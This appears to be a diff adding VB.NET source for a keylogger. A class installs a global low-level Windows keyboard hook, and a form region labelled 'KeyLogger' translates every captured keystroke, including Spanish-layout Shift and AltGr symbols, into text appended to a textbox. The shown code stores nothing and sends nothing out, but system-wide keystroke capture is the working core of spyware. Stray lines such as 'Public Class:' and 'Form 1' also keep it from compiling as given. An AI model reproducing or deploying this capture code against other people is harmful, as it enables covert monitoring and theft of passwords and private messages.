@@ -1,0 +1,241 @@
+Public Class:
+#Region " KeyboardHook Class "
+
+Imports System.Runtime.InteropServices
+
+Public Class KeyboardHook
+
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
+    End Function
+
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
+    End Function
+
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
+    End Function
+
+    <StructLayout(LayoutKind.Sequential)> _
+    Private Structure KBDLLHOOKSTRUCT
+        Public vkCode As UInt32
+        Public scanCode As UInt32
+        Public flags As KBDLLHOOKSTRUCTFlags
+        Public time As UInt32
+        Public dwExtraInfo As UIntPtr
+    End Structure
+
+    <Flags()> _
+    Private Enum KBDLLHOOKSTRUCTFlags As UInt32
+        LLKHF_EXTENDED = &H1
+        LLKHF_INJECTED = &H10
+        LLKHF_ALTDOWN = &H20
+        LLKHF_UP = &H80
+    End Enum
+
+    Public Shared Event KeyDown(ByVal Key As Keys)
+    Public Shared Event KeyUp(ByVal Key As Keys)
+
+    Private Const WH_KEYBOARD_LL As Integer = 13
+    Private Const HC_ACTION As Integer = 0
+    Private Const WM_KEYDOWN = &H100
+    Private Const WM_KEYUP = &H101
+    Private Const WM_SYSKEYDOWN = &H104
+    Private Const WM_SYSKEYUP = &H105
+
+    Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
+
+    Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
+    Private HHookID As IntPtr = IntPtr.Zero
+
+    Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
+        If (nCode = HC_ACTION) Then
+            Dim struct As KBDLLHOOKSTRUCT
+            Select Case wParam
+                Case WM_KEYDOWN, WM_SYSKEYDOWN
+                    RaiseEvent KeyDown(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
+                Case WM_KEYUP, WM_SYSKEYUP
+                    RaiseEvent KeyUp(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
+            End Select
+        End If
+        Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
+    End Function
+
+    Public Sub New()
+        HHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KBDLLHookProcDelegate, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
+        If HHookID = IntPtr.Zero Then
+            Throw New Exception("Could not set keyboard hook")
+        End If
+    End Sub
+
+    Protected Overrides Sub Finalize()
+        If Not HHookID = IntPtr.Zero Then
+            UnhookWindowsHookEx(HHookID)
+        End If
+        MyBase.Finalize()
+    End Sub
+
+End Class
+
+#End Region
+
+
+
+Form 1
+#Region " KeyLogger "
+
+    Public WithEvents KeysHook As New KeyboardHook
+
+    Dim Auto_Backspace_Key As Boolean = True
+    Dim Auto_Enter_Key As Boolean = True
+    Dim Auto_Tab_Key As Boolean = True
+    Dim No_F_Keys As Boolean = False
+
+    Private Sub KeysHook_KeyDown(ByVal Key As Keys) Handles KeysHook.KeyDown
+
+        Select Case Control.ModifierKeys
+
+            Case 393216 ' Alt-GR + Key
+
+                Select Case Key
+                    Case Keys.D1 : Key_Listener("|")
+                    Case Keys.D2 : Key_Listener("@")
+                    Case Keys.D3 : Key_Listener("#")
+                    Case Keys.D4 : Key_Listener("~")
+                    Case Keys.D5 : Key_Listener("€")
+                    Case Keys.D6 : Key_Listener("¬")
+                    Case Keys.E : Key_Listener("€")
+                    Case Keys.Oem1 : Key_Listener("[")
+                    Case Keys.Oem5 : Key_Listener("\")
+                    Case Keys.Oem7 : Key_Listener("{")
+                    Case Keys.Oemplus : Key_Listener("]")
+                    Case Keys.OemQuestion : Key_Listener("}")
+                    Case Else : Key_Listener("")
+                End Select
+
+            Case 65536 ' LShift/RShift + Key
+
+                Select Case Key
+                    Case Keys.D0 : Key_Listener("=")
+                    Case Keys.D1 : Key_Listener("!")
+                    Case Keys.D2 : Key_Listener("""")
+                    Case Keys.D3 : Key_Listener("·")
+                    Case Keys.D4 : Key_Listener("$")
+                    Case Keys.D5 : Key_Listener("%")
+                    Case Keys.D6 : Key_Listener("&")
+                    Case Keys.D7 : Key_Listener("/")
+                    Case Keys.D8 : Key_Listener("(")
+                    Case Keys.D9 : Key_Listener(")")
+                    Case Keys.Oem1 : Key_Listener("^")
+                    Case Keys.Oem5 : Key_Listener("ª")
+                    Case Keys.Oem6 : Key_Listener("¿")
+                    Case Keys.Oem7 : Key_Listener("¨")
+                    Case Keys.OemBackslash : Key_Listener(">")
+                    Case Keys.Oemcomma : Key_Listener(";")
+                    Case Keys.OemMinus : Key_Listener("_")
+                    Case Keys.OemOpenBrackets : Key_Listener("?")
+                    Case Keys.OemPeriod : Key_Listener(":")
+                    Case Keys.Oemplus : Key_Listener("*")
+                    Case Keys.OemQuestion : Key_Listener("Ç")
+                    Case Keys.Oemtilde : Key_Listener("Ñ")
+                    Case Else : Key_Listener("")
+                End Select
+
+            Case Else
+
+                If Key.ToString.Length = 1 Then ' Single alpha key
+
+                    If Control.IsKeyLocked(Keys.CapsLock) Or Control.ModifierKeys = Keys.Shift Then
+                        Key_Listener(Key.ToString.ToUpper)
+                    Else
+                        Key_Listener(Key.ToString.ToLower)
+                    End If
+
+                Else
+
+                    Select Case Key ' Single special key 
+                        Case Keys.Add : Key_Listener("+")
+                        Case Keys.Back : Key_Listener("{BackSpace}")
+                        Case Keys.D0 : Key_Listener("0")
+                        Case Keys.D1 : Key_Listener("1")
+                        Case Keys.D2 : Key_Listener("2")
+                        Case Keys.D3 : Key_Listener("3")
+                        Case Keys.D4 : Key_Listener("4")
+                        Case Keys.D5 : Key_Listener("5")
+                        Case Keys.D6 : Key_Listener("6")
+                        Case Keys.D7 : Key_Listener("7")
+                        Case Keys.D8 : Key_Listener("8")
+                        Case Keys.D9 : Key_Listener("9")
+                        Case Keys.Decimal : Key_Listener(".")
+                        Case Keys.Delete : Key_Listener("{Supr}")
+                        Case Keys.Divide : Key_Listener("/")
+                        Case Keys.End : Key_Listener("{End}")
+                        Case Keys.Enter : Key_Listener("{Enter}")
+                        Case Keys.F1 : Key_Listener("{F1}")
+                        Case Keys.F10 : Key_Listener("{F10}")
+                        Case Keys.F11 : Key_Listener("{F11}")
+                        Case Keys.F12 : Key_Listener("{F12}")
+                        Case Keys.F2 : Key_Listener("{F2}")
+                        Case Keys.F3 : Key_Listener("{F3}")
+                        Case Keys.F4 : Key_Listener("{F4}")
+                        Case Keys.F5 : Key_Listener("{F5}")
+                        Case Keys.F6 : Key_Listener("{F6}")
+                        Case Keys.F7 : Key_Listener("{F7}")
+                        Case Keys.F8 : Key_Listener("{F8}")
+                        Case Keys.F9 : Key_Listener("{F9}")
+                        Case Keys.Home : Key_Listener("{Home}")
+                        Case Keys.Insert : Key_Listener("{Insert}")
+                        Case Keys.Multiply : Key_Listener("*")
+                        Case Keys.NumPad0 : Key_Listener("0")
+                        Case Keys.NumPad1 : Key_Listener("1")
+                        Case Keys.NumPad2 : Key_Listener("2")
+                        Case Keys.NumPad3 : Key_Listener("3")
+                        Case Keys.NumPad4 : Key_Listener("4")
+                        Case Keys.NumPad5 : Key_Listener("5")
+                        Case Keys.NumPad6 : Key_Listener("6")
+                        Case Keys.NumPad7 : Key_Listener("7")
+                        Case Keys.NumPad8 : Key_Listener("8")
+                        Case Keys.NumPad9 : Key_Listener("9")
+                        Case Keys.Oem1 : Key_Listener("`")
+                        Case Keys.Oem5 : Key_Listener("º")
+                        Case Keys.Oem6 : Key_Listener("¡")
+                        Case Keys.Oem7 : Key_Listener("´")
+                        Case Keys.OemBackslash : Key_Listener("<")
+                        Case Keys.Oemcomma : Key_Listener(",")
+                        Case Keys.OemMinus : Key_Listener(".")
+                        Case Keys.OemOpenBrackets : Key_Listener("'")
+                        Case Keys.OemPeriod : Key_Listener("-")
+                        Case Keys.Oemplus : Key_Listener("+")
+                        Case Keys.OemQuestion : Key_Listener("ç")
+                        Case Keys.Oemtilde : Key_Listener("ñ")
+                        Case Keys.PageDown : Key_Listener("{AvPag}")
+                        Case Keys.PageUp : Key_Listener("{RePag}")
+                        Case Keys.Space : Key_Listener(" ")
+                        Case Keys.Subtract : Key_Listener("-")
+                        Case Keys.Tab : Key_Listener("{Tabulation}")
+                        Case Else : Key_Listener("")
+                    End Select
+
+                End If
+
+        End Select
+
+    End Sub
+
+    Public Sub Key_Listener(ByVal key As String)
+
+        If Auto_Backspace_Key AndAlso key = "{BackSpace}" Then ' Delete character
+            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.Length - 1)
+        ElseIf Auto_Enter_Key AndAlso key = "{Enter}" Then ' Insert new line
+            TextBox1.Text += ControlChars.NewLine
+        ElseIf Auto_Tab_Key AndAlso key = "{Tabulation}" Then ' Insert Tabulation
+            TextBox1.Text += ControlChars.Tab
+        ElseIf No_F_Keys AndAlso key.StartsWith("{F") Then ' Ommit F Keys
+        Else ' Print the character
+            TextBox1.Text += key
+        End If
+
+    End Sub
+
+#End Region
